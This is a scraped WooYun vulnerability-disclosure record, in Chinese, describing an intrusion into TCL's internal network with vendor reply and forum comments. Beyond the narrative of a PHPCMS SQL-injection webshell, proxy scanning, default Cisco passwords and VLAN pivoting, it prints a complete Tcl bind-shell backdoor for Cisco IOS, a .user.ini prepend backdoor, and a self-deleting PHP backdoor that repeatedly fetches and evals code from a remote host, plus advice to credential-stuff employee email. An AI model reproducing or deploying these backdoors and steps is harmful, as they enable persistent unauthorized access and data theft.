{"id": 44996, "wybug_id": "wooyun-2015-097180", "wybug_title": "从TCL某漏洞看内网渗透教学分享之内网信息探测和后渗透准备", "wybug_corp": "TCL集团财务有限公司", "wybug_author": "redrain有节操", "wybug_date": "2015-02-18 23:24", "wybug_open_date": "2015-04-04 23:26", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路", "管理后台对外", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向公众公开  简要描述： 本来打算发人人网的，但是苦逼的是我刚进去内网就貌似被t出来了，服务器直接宕了，等下次案例发人人或者其他厂商吧在内网渗透中，内网信息探测对你的渗透工作开展是否顺利至关重要，如果你能摸清楚目标内网的信息，就像开启了god mode这个案例中，我们介绍几个基本的内网探测的手法，以及如何在实战中串联十八般武艺，获取这个god mode 详细说明：  常规的，从web业务撕开口子url：bit.tcl.comgetshell很简单，phpcms的，一个Phpcms V9 uc api SQL的老洞直接getshell，拿到shell，权限很高，system看看网卡信息\n\n只有一块网卡，处于10.4.22的私网地址在这里，如果我们想要通过这台机器对内网进行渗透，首要工作就是进行内网探测，介绍几个方法0x00如果你只是需要对内网的业务主机进行渗透，那么可以优先查看一下hosts，针对hosts中的主机针对性渗透0x01如果想要对整个C段主机进行渗透，比较完整方便的方法还是扫描，这里就需要我们进行内网代理，然后扫描正向代理or反向代理，因为此处主机无法通外网，所以我们选择正向代理一个我常用的代理reGeorghttps://github.com/sensepost/reGeorg上传代理脚本，然后用regerog尽心代理链接（regeorg需要urllib3，所以各位需要用到时，先安装这个模块）\n\n用nmap等进行代理扫描，很简单可以使用proxychains或者win 下使用proxycap因为我们这里指定的端口时2333，所以修改一下proxychains的conf\n\n以此来尽心内网C段的信息探测0x02当然，仅仅通过扫描，并不能获取到最全面的信息，最全面的信息，要么就是我们拿到了内网拓扑，或者，我直接日下了路由器路由器，走你～通过之前的nmap扫描，我们大概知道了开放web服务的主机\n\n访问11，12，13三台主机后，发现时cisco的路由器，且是开放web管理的cisco路由器，默认密码cisco成功进入\n\n开放web管理的思科路由是可以在web端执行命令的，但是我们的路由权限只是1，cisco的权限分级大概是这样：管理员是7 ，但是有15个权限分级，15的权限基本属于为所欲为权限在这里，因为看到当前路由ios版本号是\n\n低版本的iOS可以利用我之前的一个老洞进行cisco路由提权因为在web端，可以用privilege15进行命令操作\n\n这样我们就拥有了一个privilege15的用户，赶紧telnet进路由看看配置，一定会有惊喜\n\n看到我们确实拿到了privilege15的用户那么，来瞅瞅路由配置吧\nDZSW-3560-A#enenDZSW-3560-A#show running-configshow running-configBuilding configuration...Current configuration : 3678 bytes!version 12.2no service padservice timestamps debug uptimeservice timestamps log uptimeservice password-encryption!hostname DZSW-3560-A!enable password 7 121A0C041104!username admin privilege 15 password 7 1543595F507F7Dno aaa new-modelsystem mtu routing 1500vtp mode transparentip subnet-zeroip routing!!!! --More--!!no file verify autospanning-tree mode pvstspanning-tree extend system-id!vlan internal allocation policy ascending!vlan 218 name Call_Center!vlan 220!vlan 222 name WEB!vlan 223 name DB!!interface Port-channel1 switchport trunk encapsulation dot1q switchport mode trunk!interface Port-channel2 description Connect_To_YDBFZX-C3750_Po1 no switchport ip address 10.68.3.2 255.255.255.252!interface GigabitEthernet0/1 switchport access vlan 218 switchport mode access!interface GigabitEthernet0/2 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/3 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/4 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/5 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/6 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/7 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/8 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/9 switchport access vlan 222 switchport mode access!interface GigabitEthernet0/10 switchport access vlan 222 switchport mode access!\n几个业务，DB，办公的vlan跃然于眼前，当前我们实在web vlan的其他两台路由也一样到玩法===================分割线==================那么有的同学就问了，如果我不满足于在web vlan闹腾，如果我作为一个黑阔，我要去办公vlan去耍怎么办，哟西～既然我们都已经控制了路由啦，当然可以去闹！因为我不是运维狗，所以咨询了z8大屌，他告诉我，少年，你听过GRE隧道么，诶嘿～\nGRE 是一种最传统的隧道协议，其根本功能就是要实现隧道功能，通过隧道连接的两个远程网络就如同直连，GRE在两个远程网络之间模拟出直连链路，从而使网络间 达到直连的效果\nhttp://itchenyi.blog.51cto.com/4745638/1137143http://www.codesky.net/article/201207/171461.html大家可以参考这两个地方通过GRE隧道配置，我们就可以跑到另外一个vlan去闹了～（做人留一线，日后好相见，就不截图call_center的vlan了，渗透其网段的思路也和之前介绍的一样）＝＝＝＝＝＝＝＝＝分割线＝＝＝＝＝＝＝＝＝＝＝＝＝＝那么又有同学举手了，如果我渗透的目标无法短时间内就完成，需要进行后渗透，我怎么样才能让我之后的渗透也方便呢？好的，同学你很猥琐，这里介绍几个平时我们工作中常用的留后门多法子首先，这个cisco的路由后门，我们肯定要优先留一个cisco路由器支持TCL cisco脚本，所以我们的后门也通过这个来完成\n# TclShell.tcl v0.1 by Andy Davis, IRM 2007## IRM accepts no responsibility for the misuse of this code# It is provided for demonstration purposes onlyproc callback {sock addr port} {  fconfigure $sock -translation lf -buffering line  puts $sock \" \"  puts $sock \"---|---|---|---|---|---|---|---|---|---|---|---|-\"  puts $sock \"TclShell v0.1 by Andy Davis, IRM 2007\"  puts $sock \"---|---|---|---|---|---|---|---|---|---|---|---|-\"  puts $sock \" \"  set response [exec \"sh ver | inc IOS\"]  puts $sock $response  set response [exec \"sh priv\"]  puts $sock $response  puts $sock \" \"  puts $sock \"Enter IOS command:\"  fileevent $sock readable [list echo $sock]  }  proc echo {sock} {  global var  if {[eof $sock] || [catch {gets $sock line}]} {  } else {  set response [exec \"$line\"]  puts $sock $response  }  }  set port 1234  set sh [socket -server callback $port]  vwait var  close $sh\n这是老外写的一个后门，先在路由中开启tclsh模式，然后引入后门脚本Router#tclshRouter(tcl)#source tftp://x.x.x.x/backdoor.tcl这样我们就留下来后门，下次链接可以直接在网段内的机器直接nc 路由ip 1234（端口在后门脚本中修改）ok，如果web的入口断了，这一切都白搭，所以我们还应该对web的机器留下比较隐藏的后门说两个，一个是文件形的后门这个办法之前phinthon老师已经说过了，就是通过php.ini或者user.ini留后门在一个有正常php文件的目录下新建一个.user.ini内容为auto_prepend_file=xxx.gif(png/jpg)之类而你的xxx.gif之类就是你的后门具体可以参考http://drops.wooyun.org/tips/3424第二个办法，非文件形的后门，这样的后门优势在于非常隐蔽，一般的网管都发现不了，但是有一个非常大的缺点，重启，或者进程中断后门就消失了原理大概是：后门的代码第一行删除自身，然后驻留在后台内存里，等待外部链接\n<?phpunlink($_SERVER['SCRIPT_FILENAME']);ignore_user_abort(true);set_time_limit(0);$remote_file = 'http://xxx/xxx.txt';while($code = file_get_contents($remote_file)){  @eval($code);  sleep(5);};?>\n在xxx.txt中写入你的后门代码，访问后就会删除自己并循环执行txt的代码，这是之前某人写过的了ztz最近有写了一个更赞的无文件后门，你们快去找他要除了这样的，如果主机是linux，也可以用前段时间猪猪侠说的crontab做后门   漏洞证明：  我们来大概总结一下这次渗透，首先通过外部业务撕开入口，通过代理的方式对内网进行探测，发现了cisco路由，于是利用之前的漏洞进行提权，搞定了路由器，整个vlan划分展露无遗，开启god mode因为我们这里是概念性的测试，所以尺度不能太大，但是，如果我是一个黑客，我接下来会做的事儿：利用tunna转发3389出外网链接（但是在这个场景中，出外网限制了部分端口，但是可以查询dns，我们应该利用端口复用的方式），远程桌面后扩大战果（嗅探其他机器）读数据库我们看到了很多tcl的员工用户数据，可以直接对tcl的企业邮箱直接撞裤攻击\n\n因为路由器搞定了，跨vlan到另外的段，继续进行渗透概念性证明图：\n\n\n\n\n\n   修复方案：  修复主要看这么几个地方：外部业务，及时打补丁，控制权限内网弱口令问题内网主机及时补丁路由器及时升级你们的OPS后台还存在测试用户登陆的问题，此处的漏洞说明就不截图了   版权声明：转载请注明来源 redrain有节操@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-27 15:45 厂商回复： 非常感谢您的反馈，我们将会联系酷友公司进行相应的调整。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-13 22:15 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  你是炊bb徒弟？    \n     2015-02-13 22:16 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @黑暗游侠 明显不是，你为啥这么认为    \n     2015-02-13 22:18 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @redrain有节操 以前听他说过你，然后以前也看到过redrain这个名字    \n     2015-02-13 22:19 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @黑暗游侠 原来还有个我？    \n     2015-02-13 22:20 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @redrain有节操 你签名是猪头子你师父，猪头子好像也是炊bb徒弟。。。    \n     2015-02-13 22:20 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @redrain有节操 就是ztz，ztz肯定是    \n     2015-02-13 22:22 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @黑暗游侠 我开玩笑的，@猪头子 是个狗～我是人噻    \n     2015-02-13 22:39 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  0 0 围观下    \n     2015-02-13 22:50 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  @黑暗游侠 我开玩笑的，@猪头子 是个狗～我是人噻    \n     2015-02-13 22:53 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  黑客还不睡啊    \n     2015-02-13 22:55 |    \t\t请叫我小号 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 1)\t\t \n  为什么不审洞呢？@疯狗    \n     2015-02-13 23:04 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  跪舔redrain湿傅    \n     2015-02-13 23:34 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @phith0n 我只是来2015年打卡以及膜拜phith0n师傅的    \n     2015-02-14 00:26 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  @phith0n 我只是来2015年打卡以及膜拜phith0n师傅的     \n     2015-02-14 05:09 |    \t\t存在敏感词 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:9        | 昵称存在敏感词)\t\t \n  @黑暗游侠  居然还有人记得brk.. 感动    \n     2015-02-14 08:51 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  @存在敏感词 消失好久了....    \n     2015-02-14 09:19 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  果然被雷劈了    \n     2015-02-14 09:30 |    \t\tT0ne5 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 搬砖真的很累。)\t\t \n  WY牛多    \n     2015-02-14 11:19 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  good大牛    \n     2015-02-14 11:40 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  我就习惯这种教学漏洞  能学到很多思路技术    \n     2015-02-14 14:36 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  我就习惯这种教学漏洞 能学到很多思路技术     \n     2015-02-14 20:47 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  汪汪汪    \n     2015-02-14 22:10 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  汪汪汪    \n     2015-02-18 23:59 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  刚看到忽略的说。。。。。。啥情况    \n     2015-02-19 00:30 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  这也行    \n     2015-02-19 00:39 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  单曲循环： 《301祝大家羊年大吉》·mp3  ▬▬▬▬▬◙▬▬▬▬▬▬▬▬        ◂◂     ►    ▐▐       ▸▸    \n     2015-02-19 02:09 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @咸鱼翻身 刚才不是公开的吗，汗！！！ 我还看完了呢……    \n     2015-02-19 07:30 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  一堆代码。。。。    \n     2015-02-19 09:44 |    \t\t一天到晚吃 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:23        | 好好看,好好学 test12xx)\t\t \n  留名    \n     2015-02-19 12:27 |    \t\tTh1nk \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:21        | 关注苍老师与波多野老师)\t\t \n  redrain老师快去博客发布内部教程。跪舔。    \n     2015-02-19 13:12 |    \t\ttodaro \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:12        | 完结。)\t\t \n  坐等受教育    \n     2015-02-19 15:09 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  资深赛棍    \n     2015-02-19 15:35 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  啪啪啪    \n     2015-02-19 19:02 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  真想看看，最近一直在看TCL的分站。    \n     2015-02-20 16:21 |    \t\t小呆呆 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:7        | 每次有人骂我猪我都说我偶像也是猪)\t\t \n  这是要连载的节奏啊    \n     2015-02-27 16:16 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  mark学习    \n     2015-02-27 17:46 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  肯定又是被ZTZ吊打了一晚上想出来的淫荡招数！    \n     2015-03-17 01:35 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  用nmap等进行代理扫描，很简单可以使用proxychains或者win 下使用proxycap额     \n     2015-03-17 01:38 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  proxychains需要设置吧      \n     2015-03-17 06:15 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @mango proxifier 也不错哦。    \n     2015-03-17 09:38 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  @黑暗游侠 居然还有人记得brk.. 感动（炊B一去不复返）    \n     2015-03-17 11:23 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @_Thorns 这个只了解win的    \n     2015-03-19 16:01 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  算是GRE隧道的应用和TCL后门应用把，这东西偏网络层了，赞一个！http://drops.wooyun.org/tips/85    \n     2015-03-30 13:47 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  我ztz师傅说你们谁想要那个后门的先来我这里交定金    \n     2015-03-31 17:46 |    \t\tlion(lp) \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:14        | 本人菜。。。千年实习白帽子)\t\t \n  额，楼主，你日的是台交换机。。。     \n     2015-04-05 00:09 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:22        | :))\t\t \n  不错    \n     2015-04-05 07:29 |    \t\tdarker \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:26        | = =)\t\t \n  师傅，我回来了。    \n     2015-04-05 11:12 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  那是台cisco三层交换话说我没看懂为什么要用GRE，直接通过三层路由不就过去了吗    \n     2015-04-05 11:31 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  额,通过三层路由到公网不是更方便吗？    \n     2015-04-05 18:33 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  nmap如何扫描弱口令啊    \n     2015-04-06 10:45 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  这是kali?    \n     2015-04-06 10:55 |    \t\tHax0rs \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:4        | Hax0rs)\t\t \n  完全看不懂啊    \n     2015-04-15 23:54 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:44        | 关注网络安全，提高技术！)\t\t \n  GRE tunnelinterface Tunne100 ip address x.x.x.x 255.255.255.252 ip mtu 1500 ip tcp adjust-mss 1400 tunnel source x.x.x.x tunnel destination x.x.x.x    \n     2015-07-26 14:13 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  GRE隧道还是不懂。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}